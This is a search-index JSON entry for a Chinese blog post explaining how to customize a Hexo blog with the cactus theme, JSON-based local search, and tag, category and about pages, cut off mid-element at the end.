[{"title":"搭建Hexo博客进阶","url":"/2020/02/29/%E6%90%AD%E5%BB%BAHexo%E5%8D%9A%E5%AE%A2%E8%BF%9B%E9%98%B6/","content":"<h1 id=\"搭建Hexo博客进阶\"><a href=\"#搭建Hexo博客进阶\" class=\"headerlink\" title=\"搭建Hexo博客进阶\"></a>搭建Hexo博客进阶</h1><h2 id=\"更换模板\"><a href=\"#更换模板\" class=\"headerlink\" title=\"更换模板\"></a>更换模板</h2><p>到themes目录下，下载自己喜欢主题模板</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/probberechts/hexo-theme-cactus.git</span><br></pre></td></tr></table></figure>\n<p>在项目的_config.yml文件中进行更换主题</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">theme: hexo-theme-cactus</span><br></pre></td></tr></table></figure>\n<p>在项目目录下，打开git bash，输入以下命令，清除缓存，生成静态文件，查看效果</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">hexo clean</span><br><span class=\"line\">hexo g</span><br><span class=\"line\">hexo s  <span class=\"comment\">#相当于 启动服务 hexo server</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"新建一个导航栏的项\"><a href=\"#新建一个导航栏的项\" class=\"headerlink\" title=\"新建一个导航栏的项\"></a>新建一个导航栏的项</h2><p>在.&#x2F;themes&#x2F;cactus&#x2F;_config.yml找到nav</p>\n<p><img src=\"C-a5CXYmE9OHOUAtBMIgp_FvbBJmTlQW6DqHBr2Sf7o.png\" alt=\"image\"></p>\n<p><img src=\"Nb5nWx1QkeQdj5eanykeR44MqMoc4Mp-Zr4Skuk_I7A.png\" alt=\"image\"></p>\n<h2 id=\"更换语言类型\"><a href=\"#更换语言类型\" class=\"headerlink\" title=\"更换语言类型\"></a>更换语言类型</h2><p>更换项目的_config.yml 为下面的内容即可</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># Site</span></span><br><span class=\"line\">title: 兀自</span><br><span class=\"line\">subtitle: <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">description: <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">keywords:</span><br><span class=\"line\">author: Garckz</span><br><span class=\"line\">language: zh-CN</span><br><span class=\"line\">timezone: <span class=\"string\">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"修改欢迎页面的内容\"><a href=\"#修改欢迎页面的内容\" class=\"headerlink\" title=\"修改欢迎页面的内容\"></a>修改欢迎页面的内容</h2><p>先查看你language用的语言模板，这里是：zh-CN</p>\n<p>所以修改主题文件夹下面的language文件下面的zh-CN.yml文件的内容即可。</p>\n<h2 id=\"添加搜索-XML\"><a href=\"#添加搜索-XML\" class=\"headerlink\" title=\"添加搜索(XML)\"></a>添加搜索(XML)</h2><p>先在在.&#x2F;themes&#x2F;cactus&#x2F;_config.yml找到nav添加一个标签。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">nav:</span><br><span class=\"line\">  home: /</span><br><span class=\"line\">  about: /about/</span><br><span class=\"line\">  articles: /archives/</span><br><span class=\"line\">  projects: http://github.com/probberechts</span><br><span class=\"line\">  search: /search/</span><br></pre></td></tr></table></figure>\n<p>用到了 <a href=\"https://github.com/wzpan/hexo-generator-search\" title=\"hexo-generator-search\">hexo-generator-search</a> 的 Hexo 插件来做内容搜索，安装命令如下</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">npm install hexo-generator-searchdb --save</span><br></pre></td></tr></table></figure>\n<p><img src=\"A_G15Imlu2VdAlS_XN-XiIyTocPIenmtwXRqJwje_pM.png\" alt=\"image\"></p>\n<p>执行下面命令创建一个</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">hexo new page search</span><br></pre></td></tr></table></figure>\n<p>进入项目地址下的source&#x2F;search&#x2F;index.md，修改md文件的头为</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">---</span><br><span class=\"line\">title: Search</span><br><span class=\"line\"><span class=\"built_in\">type</span>: search</span><br><span class=\"line\">---</span><br></pre></td></tr></table></figure>\n<p><img src=\"uP6XsJwwD34izTmKUtWbOB8jrWpXSv00OmjGd2f6a6Y.png\" alt=\"image\"></p>\n<p>出现页面之后，搜索到的内容不可以超链接点过去访问，这时候需要进行以下的配置。</p>\n<p><strong>配置1</strong></p>\n<p>在项目下的 <code>_config.yml</code> 文件中，新增以下的配置项：</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#Search</span></span><br><span class=\"line\"><span class=\"attr\">search:</span></span><br><span class=\"line\">  <span class=\"attr\">path:</span> <span class=\"string\">search.xml</span></span><br><span class=\"line\">  <span class=\"attr\">field:</span> <span class=\"string\">post</span></span><br><span class=\"line\">  <span class=\"attr\">content:</span> <span class=\"literal\">true</span></span><br><span class=\"line\">  <span class=\"attr\">format:</span> <span class=\"string\">html</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"KUhFEBqwSuss11_P-eGBshQhrbDC2W5_BWp0MMtB65I.png\" alt=\"image\"></p>\n<ul>\n<li><p>path：表示搜索后生成的文件路径，可以生成xml和json两种格式。</p>\n</li>\n<li><p>field：表示搜索的范围，有“​​post、page和all​​”三种值。</p>\n</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">post：所有的文章；</span><br><span class=\"line\">page：所有顶部导航选项的页面；</span><br><span class=\"line\">all：所有的文章和顶部导航选项的页面。</span><br></pre></td></tr></table></figure>\n<ul>\n<li>content：是否包含搜索到的文章的全部内容。如果false，生成的结果只包括标题和创建时间这些信息，没有文章主体。默认情况下是true.</li>\n<li>format：搜索到的内容、选项的格式。</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">html(默认)：将html原文本缩略。</span><br><span class=\"line\">striptags：将html原文本缩略，并删除所有标记。</span><br><span class=\"line\">raw：记下每一篇文章或每一页的文字。</span><br></pre></td></tr></table></figure>\n\n\n<p><strong>配置2</strong></p>\n<p>主题文件下_config.yml文件添加下面的内容</p>\n<p> all：所有的文章和顶部导航选项的页面。</p>\n<p><img src=\"DrgbW9P7qj4biCTE_A4c6ObM-l6QlTw4E_tkh3PLgMI.png\" alt=\"image\"></p>\n<h2 id=\"添加搜索（JSON）\"><a href=\"#添加搜索（JSON）\" class=\"headerlink\" title=\"添加搜索（JSON）\"></a>添加搜索（JSON）</h2><p>上面我们使用.xml的方式做搜索。偶时候链接错误，出现undefined。</p>\n<p>网上的说法是：某些文章有格式问题，导致生成的search.xml也出错了。</p>\n<p>下面我们使用json格式的方式来实现该功能。</p>\n<h3 id=\"第一步\"><a href=\"#第一步\" class=\"headerlink\" title=\"第一步\"></a>第一步</h3><p>在项目的_config.yml文件中把search.xml修改为search.json</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">原本：</span><br><span class=\"line\">search:</span><br><span class=\"line\">  path: search.xml</span><br><span class=\"line\">  field: post</span><br><span class=\"line\"></span><br><span class=\"line\">修改为：</span><br><span class=\"line\">search:</span><br><span class=\"line\">  path: search.json</span><br><span class=\"line\">  field: post</span><br></pre></td></tr></table></figure>\n<h3 id=\"第二步\"><a href=\"#第二步\" class=\"headerlink\" title=\"第二步\"></a>第二步</h3><p>找到主题的search.ejs模板文件，我这里的路径是：themes&#x2F;hexo-theme-cactus&#x2F;layout&#x2F;_partial&#x2F;search.ejs</p>\n<p>我这里的这个主题不需要修改。其它主题的修改方式：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;script <span class=\"built_in\">type</span>=<span class=\"string\">&quot;text/javascript&quot;</span>&gt;</span><br><span class=\"line\">$(<span class=\"function\"><span class=\"title\">function</span></span> () &#123;</span><br><span class=\"line\">    console.log(<span class=\"string\">&quot;lets go！&quot;</span>);</span><br><span class=\"line\">    console.log(<span class=\"string\">&quot;&lt;%= config.root %&gt;&quot;</span>);</span><br><span class=\"line\">    searchFunc(<span class=\"string\">&quot;&lt;%= config.root %&gt;&quot;</span> + <span class=\"string\">&quot;search.xml&quot;</span>, <span class=\"string\">&#x27;searchInput&#x27;</span>, <span class=\"string\">&#x27;searchResult&#x27;</span>);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\">&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<p>修改为：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;script <span class=\"built_in\">type</span>=<span class=\"string\">&quot;text/javascript&quot;</span>&gt;</span><br><span class=\"line\">$(<span class=\"function\"><span class=\"title\">function</span></span> () &#123;</span><br><span class=\"line\">    console.log(<span class=\"string\">&quot;lets go！&quot;</span>);</span><br><span class=\"line\">    console.log(<span class=\"string\">&quot;&lt;%= config.root %&gt;&quot;</span>);</span><br><span class=\"line\">    searchFunc(<span class=\"string\">&quot;&lt;%= config.root %&gt;&quot;</span> + <span class=\"string\">&quot;search.json&quot;</span>, <span class=\"string\">&#x27;searchInput&#x27;</span>, <span class=\"string\">&#x27;searchResult&#x27;</span>);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\">&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<h3 id=\"最后一步\"><a href=\"#最后一步\" class=\"headerlink\" title=\"最后一步\"></a>最后一步</h3><p>修改你的search的本地js文件，我这里的路径是：themes&#x2F;hexo-theme-cactus&#x2F;source&#x2F;js&#x2F;search.js</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">原本：</span><br><span class=\"line\">    dataType: <span class=\"string\">&quot;xml&quot;</span>,</span><br><span class=\"line\">    success: <span class=\"keyword\">function</span>(xmlResponse) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">修改为：</span><br><span class=\"line\">    dataType: <span class=\"string\">&quot;json&quot;</span>,</span><br><span class=\"line\">    success: <span class=\"keyword\">function</span>(datas) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">还需要注释掉：</span><br><span class=\"line\">      // get the contents from search data</span><br><span class=\"line\">      // var datas = $(<span class=\"string\">&quot;entry&quot;</span>, xmlResponse).map(<span class=\"function\"><span class=\"title\">function</span></span>() &#123;</span><br><span class=\"line\">      //   <span class=\"built_in\">return</span> &#123;</span><br><span class=\"line\">      //     title: $(<span class=\"string\">&quot;title&quot;</span>, this).text(),</span><br><span class=\"line\">      //     content: $(<span class=\"string\">&quot;content&quot;</span>, this).text(),</span><br><span class=\"line\">      //     url: $(<span class=\"string\">&quot;link&quot;</span>, this).attr(<span class=\"string\">&quot;href&quot;</span>)</span><br><span class=\"line\">      //   &#125;;</span><br><span class=\"line\">      // &#125;).get();</span><br></pre></td></tr></table></figure>\n<p>最终结果为：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">// A <span class=\"built_in\">local</span> search script with the <span class=\"built_in\">help</span> of</span><br><span class=\"line\">// [hexo-generator-search](https://github.com/PaicHyperionDev/hexo-generator-search)</span><br><span class=\"line\">// Copyright (C) 2015</span><br><span class=\"line\">// Joseph Pan &lt;http://github.com/wzpan&gt;</span><br><span class=\"line\">// Shuhao Mao &lt;http://github.com/maoshuhao&gt;</span><br><span class=\"line\">// This library is free software; you can redistribute it and/or modify</span><br><span class=\"line\">// it under the terms of the GNU Lesser General Public License as</span><br><span class=\"line\">// published by the Free Software Foundation; either version 2.1 of the</span><br><span class=\"line\">// License, or (at your option) any later version.</span><br><span class=\"line\">//</span><br><span class=\"line\">// This library is distributed <span class=\"keyword\">in</span> the hope that it will be useful, but</span><br><span class=\"line\">// WITHOUT ANY WARRANTY; without even the implied warranty of</span><br><span class=\"line\">// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU</span><br><span class=\"line\">// Lesser General Public License <span class=\"keyword\">for</span> more details.</span><br><span class=\"line\">//</span><br><span class=\"line\">// You should have received a copy of the GNU Lesser General Public</span><br><span class=\"line\">// License along with this library; <span class=\"keyword\">if</span> not, write to the Free Software</span><br><span class=\"line\">// Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA</span><br><span class=\"line\">// 02110-1301 USA</span><br><span class=\"line\">//</span><br><span class=\"line\">// Modified by:</span><br><span class=\"line\">// Pieter Robberechts &lt;http://github.com/probberechts&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">/*exported searchFunc*/</span><br><span class=\"line\">var searchFunc = <span class=\"keyword\">function</span>(path, searchId, contentId) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">function</span> stripHtml(html) &#123;</span><br><span class=\"line\">    html = html.replace(/&lt;style([\\s\\S]*?)&lt;\\/style&gt;/gi, <span class=\"string\">&quot;&quot;</span>);</span><br><span class=\"line\">    html = html.replace(/&lt;script([\\s\\S]*?)&lt;\\/script&gt;/gi, <span class=\"string\">&quot;&quot;</span>);</span><br><span class=\"line\">    html = html.replace(/&lt;figure([\\s\\S]*?)&lt;\\/figure&gt;/gi, <span class=\"string\">&quot;&quot;</span>);</span><br><span class=\"line\">    html = html.replace(/&lt;\\/div&gt;/ig, <span class=\"string\">&quot;\\n&quot;</span>);</span><br><span class=\"line\">    html = html.replace(/&lt;\\/li&gt;/ig, <span class=\"string\">&quot;\\n&quot;</span>);</span><br><span class=\"line\">    html = html.replace(/&lt;li&gt;/ig, <span class=\"string\">&quot;  *  &quot;</span>);</span><br><span class=\"line\">    html = html.replace(/&lt;\\/ul&gt;/ig, <span class=\"string\">&quot;\\n&quot;</span>);</span><br><span class=\"line\">    html = html.replace(/&lt;\\/p&gt;/ig, <span class=\"string\">&quot;\\n&quot;</span>);</span><br><span class=\"line\">    html = html.replace(/&lt;br\\s*[\\/]?&gt;/gi, <span class=\"string\">&quot;\\n&quot;</span>);</span><br><span class=\"line\">    html = html.replace(/&lt;[^&gt;]+&gt;/ig, <span class=\"string\">&quot;&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">return</span> html;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">function</span> getAllCombinations(keywords) &#123;</span><br><span class=\"line\">    var i, j, result = [];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (i = 0; i &lt; keywords.length; i++) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (j = i + 1; j &lt; keywords.length + 1; j++) &#123;</span><br><span class=\"line\">            result.push(keywords.slice(i, j).<span class=\"built_in\">join</span>(<span class=\"string\">&quot; &quot;</span>));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">return</span> result;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  $.ajax(&#123;</span><br><span class=\"line\">    url: path,</span><br><span class=\"line\">    // dataType: <span class=\"string\">&quot;xml&quot;</span>,</span><br><span class=\"line\">    dataType: <span class=\"string\">&quot;json&quot;</span>,</span><br><span class=\"line\">    //success: <span class=\"keyword\">function</span>(xmlResponse) &#123;</span><br><span class=\"line\">    success: <span class=\"keyword\">function</span>(datas) &#123;</span><br><span class=\"line\">      // get the contents from search data</span><br><span class=\"line\">      // var datas = $(<span class=\"string\">&quot;entry&quot;</span>, xmlResponse).map(<span class=\"function\"><span class=\"title\">function</span></span>() &#123;</span><br><span class=\"line\">      //   <span class=\"built_in\">return</span> &#123;</span><br><span class=\"line\">      //     title: $(<span class=\"string\">&quot;title&quot;</span>, this).text(),</span><br><span class=\"line\">      //     content: $(<span class=\"string\">&quot;content&quot;</span>, this).text(),</span><br><span class=\"line\">      //     url: $(<span class=\"string\">&quot;link&quot;</span>, this).attr(<span class=\"string\">&quot;href&quot;</span>)</span><br><span class=\"line\">      //   &#125;;</span><br><span class=\"line\">      // &#125;).get();</span><br><span class=\"line\"></span><br><span class=\"line\">      var <span class=\"variable\">$input</span> = document.getElementById(searchId);</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (!<span class=\"variable\">$input</span>) &#123; <span class=\"built_in\">return</span>; &#125;</span><br><span class=\"line\">      var <span class=\"variable\">$resultContent</span> = document.getElementById(contentId);</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"variable\">$input</span>.addEventListener(<span class=\"string\">&quot;input&quot;</span>, <span class=\"function\"><span class=\"title\">function</span></span>()&#123;</span><br><span class=\"line\">        var resultList = [];</span><br><span class=\"line\">        var keywords = getAllCombinations(this.value.trim().toLowerCase().<span class=\"built_in\">split</span>(<span class=\"string\">&quot; &quot;</span>))</span><br><span class=\"line\">          .<span class=\"built_in\">sort</span>(<span class=\"keyword\">function</span>(a,b) &#123; <span class=\"built_in\">return</span> b.split(<span class=\"string\">&quot; &quot;</span>).length - a.split(<span class=\"string\">&quot; &quot;</span>).length; &#125;);</span><br><span class=\"line\">        <span class=\"variable\">$resultContent</span>.innerHTML = <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (this.value.trim().length &lt;= 0) &#123;</span><br><span class=\"line\">          <span class=\"built_in\">return</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        // perform <span class=\"built_in\">local</span> searching</span><br><span class=\"line\">        datas.forEach(<span class=\"keyword\">function</span>(data) &#123;</span><br><span class=\"line\">          var matches = 0;</span><br><span class=\"line\">          <span class=\"keyword\">if</span> (!data.title || data.title.trim() === <span class=\"string\">&quot;&quot;</span>) &#123;</span><br><span class=\"line\">            data.title = <span class=\"string\">&quot;Untitled&quot;</span>;</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">          var dataTitle = data.title.trim().toLowerCase();</span><br><span class=\"line\">          var dataTitleLowerCase = dataTitle.toLowerCase();</span><br><span class=\"line\">          var dataContent = stripHtml(data.content.trim());</span><br><span class=\"line\">          var dataContentLowerCase = dataContent.toLowerCase();</span><br><span class=\"line\">          var dataUrl = data.url;</span><br><span class=\"line\">          var indexTitle = -1;</span><br><span class=\"line\">          var indexContent = -1;</span><br><span class=\"line\">          var firstOccur = -1;</span><br><span class=\"line\">          // only match artiles with not empty contents</span><br><span class=\"line\">          <span class=\"keyword\">if</span> (dataContent !== <span class=\"string\">&quot;&quot;</span>) &#123;</span><br><span class=\"line\">            keywords.forEach(<span class=\"keyword\">function</span>(keyword) &#123;</span><br><span class=\"line\">              indexTitle = dataTitleLowerCase.indexOf(keyword);</span><br><span class=\"line\">              indexContent = dataContentLowerCase.indexOf(keyword);</span><br><span class=\"line\"></span><br><span class=\"line\">              <span class=\"keyword\">if</span>( indexTitle &gt;= 0 || indexContent &gt;= 0 )&#123;</span><br><span class=\"line\">                matches += 1;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (indexContent &lt; 0) &#123;</span><br><span class=\"line\">                  indexContent = 0;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (firstOccur &lt; 0) &#123;</span><br><span class=\"line\">                  firstOccur = indexContent;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">              &#125;</span><br><span class=\"line\">            &#125;);</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">          // show search results</span><br><span class=\"line\">          <span class=\"keyword\">if</span> (matches &gt; 0) &#123;</span><br><span class=\"line\">            var searchResult = &#123;&#125;;</span><br><span class=\"line\">            searchResult.rank = matches;</span><br><span class=\"line\">            searchResult.str = <span class=\"string\">&quot;&lt;li&gt;&lt;a href=&#x27;&quot;</span>+ dataUrl +<span class=\"string\">&quot;&#x27; class=&#x27;search-result-title&#x27;&gt;&quot;</span>+ dataTitle +<span class=\"string\">&quot;&lt;/a&gt;&quot;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (firstOccur &gt;= 0) &#123;</span><br><span class=\"line\">              // <span class=\"built_in\">cut</span> out 100 characters</span><br><span class=\"line\">              var start = firstOccur - 20;</span><br><span class=\"line\">              var end = firstOccur + 80;</span><br><span class=\"line\"></span><br><span class=\"line\">              <span class=\"keyword\">if</span>(start &lt; 0)&#123;</span><br><span class=\"line\">                start = 0;</span><br><span class=\"line\">              &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">              <span class=\"keyword\">if</span>(start == 0)&#123;</span><br><span class=\"line\">                end = 100;</span><br><span class=\"line\">              &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">              <span class=\"keyword\">if</span>(end &gt; dataContent.length)&#123;</span><br><span class=\"line\">                end = dataContent.length;</span><br><span class=\"line\">              &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">              var matchContent = dataContent.substring(start, end);</span><br><span class=\"line\"></span><br><span class=\"line\">              // highlight all keywords</span><br><span class=\"line\">              var regS = new RegExp(keywords.join(<span class=\"string\">&quot;|&quot;</span>), <span class=\"string\">&quot;gi&quot;</span>);</span><br><span class=\"line\">              matchContent = matchContent.replace(regS, <span class=\"keyword\">function</span>(keyword) &#123;</span><br><span class=\"line\">                <span class=\"built_in\">return</span> <span class=\"string\">&quot;&lt;em class=\\&quot;search-keyword\\&quot;&gt;&quot;</span>+keyword+<span class=\"string\">&quot;&lt;/em&gt;&quot;</span>;</span><br><span class=\"line\">              &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">              searchResult.str += <span class=\"string\">&quot;&lt;p class=\\&quot;search-result\\&quot;&gt;&quot;</span> + matchContent +<span class=\"string\">&quot;...&lt;/p&gt;&quot;</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            searchResult.str += <span class=\"string\">&quot;&lt;/li&gt;&quot;</span>;</span><br><span class=\"line\">            resultList.push(searchResult);</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (resultList.length) &#123;</span><br><span class=\"line\">          resultList.<span class=\"built_in\">sort</span>(<span class=\"keyword\">function</span>(a, b) &#123;</span><br><span class=\"line\">              <span class=\"built_in\">return</span> b.rank - a.rank;</span><br><span class=\"line\">          &#125;);</span><br><span class=\"line\">          var result =<span class=\"string\">&quot;&lt;ul class=\\&quot;search-result-list\\&quot;&gt;&quot;</span>;</span><br><span class=\"line\">          <span class=\"keyword\">for</span> (var i = 0; i &lt; resultList.length; i++) &#123;</span><br><span class=\"line\">            result += resultList[i].str;</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">          result += <span class=\"string\">&quot;&lt;/ul&gt;&quot;</span>;</span><br><span class=\"line\">          <span class=\"variable\">$resultContent</span>.innerHTML = result;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;);</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n<p>最终项目的_config.yml</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">search:</span><br><span class=\"line\">  path: search.json</span><br><span class=\"line\">  field: post</span><br><span class=\"line\">  content: <span class=\"literal\">true</span></span><br><span class=\"line\">  format: html</span><br><span class=\"line\">  <span class=\"built_in\">limit</span>: 10000</span><br></pre></td></tr></table></figure>\n<p>最终主题的_config.yml</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">local_search:</span><br><span class=\"line\">  <span class=\"built_in\">enable</span>: <span class=\"literal\">true</span></span><br><span class=\"line\">  <span class=\"comment\"># auto表示改变输入就自动触发搜索</span></span><br><span class=\"line\">  <span class=\"comment\"># manual表示按下回车键或搜索按钮才触发搜索</span></span><br><span class=\"line\">  trigger: auto</span><br><span class=\"line\">  <span class=\"comment\"># 这里的数字n表示显示每篇文章搜索到的n个结果</span></span><br><span class=\"line\">  <span class=\"comment\"># -1表示显示每篇文章搜索到的全部结果(不建议)</span></span><br><span class=\"line\">  top_n_per_article: 1</span><br></pre></td></tr></table></figure>\n<h2 id=\"添加标签页\"><a href=\"#添加标签页\" class=\"headerlink\" title=\"添加标签页\"></a>添加标签页</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">hexo new page tags</span><br></pre></td></tr></table></figure>\n<p><img src=\"h1edlshktmHLnU9E-Xc1KebtW5e99chfzA5x7te3wSk.png\" alt=\"image\"></p>\n<p>根据上面的路径，找到index.md这个文件</p>\n<p>添加type: “tags” layout: “tags”到内容中，添加后是这样的：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">---</span><br><span class=\"line\">title: tags</span><br><span class=\"line\"><span class=\"built_in\">date</span>: 2023-04-29 21:30:23</span><br><span class=\"line\"><span class=\"built_in\">type</span>: <span class=\"string\">&quot;tags&quot;</span></span><br><span class=\"line\">layout: <span class=\"string\">&quot;tags&quot;</span></span><br><span class=\"line\">---</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"标签页实现标签云效果\"><a href=\"#标签页实现标签云效果\" class=\"headerlink\" title=\"标签页实现标签云效果\"></a>标签页实现标签云效果</h3><p>安装插件</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">npm install hexo-tag-cloud  --save</span><br></pre></td></tr></table></figure>\n<p>找到 tagcloud.ejs 文件，完整路径：</p>\n<p>修改为以下内容：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n<h3 id=\"文章添加标签\"><a href=\"#文章添加标签\" class=\"headerlink\" title=\"文章添加标签\"></a>文章添加标签</h3><p>在每篇文章的头部添加</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">title: Tags and Categories</span><br><span class=\"line\"><span class=\"built_in\">date</span>: 2017-12-24 23:29:53</span><br><span class=\"line\">tags:</span><br><span class=\"line\">- Foo</span><br><span class=\"line\">- Bar</span><br></pre></td></tr></table></figure>\n<p><img src=\"RXQ6UuEFKLy3acWISocGXpbos58iF4Oyf40e6MiOpm0.png\" alt=\"image\"></p>\n<h2 id=\"新分类页\"><a href=\"#新分类页\" class=\"headerlink\" title=\"新分类页\"></a>新分类页</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">hexo new page categories</span><br></pre></td></tr></table></figure>\n<p>添加下面内容</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">---</span><br><span class=\"line\">title: categories</span><br><span class=\"line\"><span class=\"built_in\">date</span>: 2023-04-29 23:32:13</span><br><span class=\"line\"><span class=\"built_in\">type</span>: <span class=\"string\">&quot;categories&quot;</span></span><br><span class=\"line\">comments: <span class=\"literal\">false</span></span><br><span class=\"line\">---</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><strong>type</strong> 字段用来指定页面类型，<strong>comments</strong> 字段用来指定该页面是否显示评论。</p>\n<p>主题文件的_config.yml的nav添加个导航栏</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">category: /categories/</span><br></pre></td></tr></table></figure>\n<p>striptags：将html原文本缩略，并删除所有标记。</p>\n<p>先新建一个导航栏标签；在主题模板文件的_config.yml文件中设置</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">nav:</span><br><span class=\"line\">  home: /</span><br><span class=\"line\">  about: /about/</span><br></pre></td></tr></table></figure>\n<h2 id=\"创建about页面\"><a href=\"#创建about页面\" class=\"headerlink\" title=\"创建about页面\"></a>创建about页面</h2><p>新建一个about的页面</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">hexo new page about</span><br></pre></td></tr></table></figure>\n<p>添加一些内容</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">---</span><br><span class=\"line\">title: about</span><br><span class=\"line\"><span class=\"built_in\">date</span>: 2023-04-29 21:49:29</span><br><span class=\"line\"><span class=\"built_in\">type</span>: about</span><br><span class=\"line\">---</span><br><span class=\"line\"><span class=\"comment\">### 单体应用存在的问题</span></span><br><span class=\"line\"></span><br><span class=\"line\">- 随着业务的发展，开发变得越来越复杂。</span><br><span class=\"line\">- 修改、新增某个功能，需要对整个系统进行测试、重新部署。</span><br></pre></td></tr></table></figure>\n<p><img src=\"OMQaMoHEHKbp9hWjVkGDr_ImQo-eqhnO_1Kz8eCaoio.png\" alt=\"image\"></p>\n<h2 id=\"新建文章\"><a href=\"#新建文章\" class=\"headerlink\" title=\"新建文章\"></a>新建文章</h2><p>方法1：</p>\n<p>定位到我们项目的根目</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">hexo new <span class=\"string\">&#x27;my-first-blog&#x27;</span></span><br></pre></td></tr></table></figure>\n<p>hexo会帮我们在“项目\\source\\_posts”下生成相关.md文件</p>\n<p><img src=\"I6B9MllFXPDmu5BESAms0VYvcirUV-Wp8QyPlquzN6U.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">---</span><br><span class=\"line\">title: my-first-blog</span><br><span class=\"line\"><span class=\"built_in\">date</span>: 2023-04-29 21:40:49</span><br><span class=\"line\">tags:</span><br><span class=\"line\">---</span><br></pre></td></tr></table></figure>\n<p>方法2：</p>\n<p>直接自己打开“项目\\source\\_posts”新建.md文件</p>\n<p>在书写的文章头添加上日期即可</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">title: Tags and Categories</span><br><span class=\"line\"><span 